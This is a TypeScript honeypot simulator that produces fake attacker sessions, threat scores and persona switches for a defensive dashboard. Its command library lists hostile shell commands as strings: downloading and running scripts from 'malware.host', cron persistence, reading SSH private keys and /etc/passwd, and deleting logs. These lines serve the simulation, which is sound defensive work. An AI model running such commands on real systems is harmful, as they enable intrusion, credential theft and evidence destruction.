import type {
  DashboardPayload,
  FeedItem,
  Persona,
  Session,
  Stats,
  ThreatLevel,
} from "./types"

const PERSONAS: Persona[] = ["generic_linux", "dev_workstation", "finance_server"]

const IP_POOL = [
  "185.220.101.42",
  "45.137.21.9",
  "103.97.176.5",
  "194.26.29.118",
  "61.177.173.12",
  "212.70.149.71",
  "159.223.44.190",
  "92.118.39.84",
  "5.188.206.18",
  "141.98.11.27",
]

interface CommandTemplate {
  command: string
  category: string
  delta: number
}

const COMMAND_LIBRARY: CommandTemplate[] = [
  { command: "uname -a", category: "recon", delta: 4 },
  { command: "whoami", category: "recon", delta: 3 },
  { command: "id", category: "recon", delta: 3 },
  { command: "cat /etc/passwd", category: "recon", delta: 8 },
  { command: "ls -la /root", category: "recon", delta: 6 },
  { command: "ps aux", category: "recon", delta: 4 },
  { command: "netstat -tulpn", category: "recon", delta: 6 },
  { command: "cat /proc/cpuinfo", category: "recon", delta: 3 },
  { command: "wget http://45.9.148.x/x.sh", category: "download", delta: 14 },
  { command: "curl -O http://malware.host/bot", category: "download", delta: 15 },
  { command: "chmod +x ./x.sh", category: "execution", delta: 10 },
  { command: "./x.sh", category: "execution", delta: 16 },
  { command: "crontab -l", category: "persistence", delta: 9 },
  { command: "echo '* * * * * curl ...' | crontab -", category: "persistence", delta: 18 },
  { command: "cat ~/.ssh/id_rsa", category: "credential", delta: 17 },
  { command: "history -c", category: "anti-forensics", delta: 12 },
  { command: "rm -rf /var/log/*", category: "anti-forensics", delta: 20 },
  { command: "iptables -F", category: "anti-forensics", delta: 14 },
  { command: "mysql -u root -p", category: "credential", delta: 11 },
  { command: "nmap -sV 10.0.0.0/24", category: "recon", delta: 13 },
]

const BENIGN: CommandTemplate[] = [
  { command: "ls", category: "benign", delta: 1 },
  { command: "pwd", category: "benign", delta: 0 },
  { command: "cd /tmp", category: "benign", delta: 1 },
  { command: "echo hello", category: "benign", delta: 0 },
]

function levelFor(score: number): ThreatLevel {
  if (score >= 85) return "critical"
  if (score >= 60) return "high"
  if (score >= 30) return "medium"
  return "low"
}

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randomId(): string {
  return Array.from({ length: 16 }, () =>
    Math.floor(Math.random() * 16).toString(16),
  ).join("")
}

interface SimSession extends Session {
  _createdAt: number
  _lastCommandAt: number
}

export class HoneypotSimulator {
  private sessions: Map<string, SimSession> = new Map()
  private feed: FeedItem[] = []
  private closedCount = 0
  private highCountClosed = 0
  private uniqueIps = new Set<string>()
  private personaSwitches = 0
  private totalSessions = 0
  private durationsClosed: number[] = []
  private fingerprintScore = 19

  constructor() {
    // Seed with a few active sessions so the dashboard isn't empty.
    for (let i = 0; i < 3; i++) this.startSession()
    // Run a few commands to give them history.
    for (let i = 0; i < 14; i++) this.runRandomCommand()
  }

  private startSession() {
    const id = randomId()
    const ip = pick(IP_POOL)
    this.uniqueIps.add(ip)
    this.totalSessions += 1
    const now = Date.now()
    const session: SimSession = {
      session_id: id,
      attacker_ip: ip,
      threat_score: 0,
      threat_level: "low",
      persona: "generic_linux",
      command_count: 0,
      start_time: new Date(now - Math.random() * 60000).toISOString(),
      duration_seconds: 0,
      score_history: [],
      _createdAt: now,
      _lastCommandAt: now,
    }
    this.sessions.set(id, session)
  }

  private runRandomCommand() {
    const active = [...this.sessions.values()]
    if (active.length === 0) return
    const session = pick(active)
    const escalating = session.command_count > 1 || Math.random() > 0.4
    const tpl = escalating ? pick(COMMAND_LIBRARY) : pick(BENIGN)

    const prevLevel = session.threat_level
    session.threat_score = Math.min(100, session.threat_score + tpl.delta)
    session.threat_level = levelFor(session.threat_score)
    session.command_count += 1
    session._lastCommandAt = Date.now()
    session.score_history.push({
      cmd_index: session.command_count,
      score: session.threat_score,
      persona: session.persona,
      command: tpl.command,
    })

    this.feed.push({
      type: "command",
      session_id: session.session_id.slice(0, 8),
      session_id_full: session.session_id,
      command: tpl.command,
      score_delta: tpl.delta,
      category: tpl.category,
      threat_level: session.threat_level,
      persona: session.persona,
      timestamp: new Date().toISOString(),
    })

    // Trigger persona switch when crossing into high threat.
    if (
      prevLevel !== "high" &&
      prevLevel !== "critical" &&
      (session.threat_level === "high" || session.threat_level === "critical")
    ) {
      const to: Persona =
        session.threat_score >= 85 ? "finance_server" : "dev_workstation"
      if (to !== session.persona) {
        this.feed.push({
          type: "persona_switch",
          session_id: session.session_id.slice(0, 8),
          session_id_full: session.session_id,
          from_persona: session.persona,
          to_persona: to,
          trigger_score: session.threat_score,
          timestamp: new Date().toISOString(),
        })
        session.persona = to
        this.personaSwitches += 1
      }
    }

    if (this.feed.length > 200) this.feed = this.feed.slice(-200)
  }

  private maybeEndSession() {
    for (const [id, s] of this.sessions) {
      const age = Date.now() - s._createdAt
      if (age > 90000 && Math.random() > 0.6) {
        this.closedCount += 1
        this.durationsClosed.push(s.duration_seconds)
        if (s.threat_level === "high" || s.threat_level === "critical") {
          this.highCountClosed += 1
        }
        this.sessions.delete(id)
      }
    }
  }

  /** Advance the simulation one tick (~2s). */
  tick() {
    // Update durations.
    for (const s of this.sessions.values()) {
      s.duration_seconds = (Date.now() - s._createdAt) / 1000
    }

    const roll = Math.random()
    if (roll > 0.45) this.runRandomCommand()
    if (roll > 0.75) this.runRandomCommand()
    if (this.sessions.size < 5 && Math.random() > 0.7) this.startSession()
    this.maybeEndSession()
    if (Math.random() > 0.85 && this.fingerprintScore < 22) {
      this.fingerprintScore += 1
    }
  }

  private buildStats(): Stats {
    const active = [...this.sessions.values()]
    const allDurations = [
      ...this.durationsClosed,
      ...active.map((s) => s.duration_seconds),
    ].filter((d) => d > 0)
    const avg =
      allDurations.length > 0
        ? allDurations.reduce((a, b) => a + b, 0) / allDurations.length
        : 0
    const totalForPct = active.length + this.closedCount
    const highCount =
      this.highCountClosed +
      active.filter(
        (s) => s.threat_level === "high" || s.threat_level === "critical",
      ).length
    const level3Pct = totalForPct > 0 ? (highCount / totalForPct) * 100 : 0
    const m = Math.floor(avg / 60)
    const sec = Math.floor(avg % 60)

    return {
      avg_duration_seconds: Math.round(avg * 10) / 10,
      avg_duration_display: `${m}m ${String(sec).padStart(2, "0")}s`,
      cowrie_avg_duration: "0m 44s",
      level3_plus_pct: Math.round(level3Pct * 10) / 10,
      cowrie_level3_pct: 11,
      fingerprint_score: this.fingerprintScore,
      fingerprint_total: 22,
      cowrie_fingerprint: 8,
      persona_switches_today: this.personaSwitches,
      unique_ips_today: this.uniqueIps.size,
      total_sessions_today: this.totalSessions,
      active_sessions: this.sessions.size,
    }
  }

  snapshot(): DashboardPayload {
    const sessions: Session[] = [...this.sessions.values()]
      .map(({ _createdAt, _lastCommandAt, ...rest }) => rest)
      .sort((a, b) => b.threat_score - a.threat_score)

    return {
      type: "update",
      sessions,
      commands: this.feed.slice(-50),
      stats: this.buildStats(),
      timestamp: new Date().toISOString(),
    }
  }
}
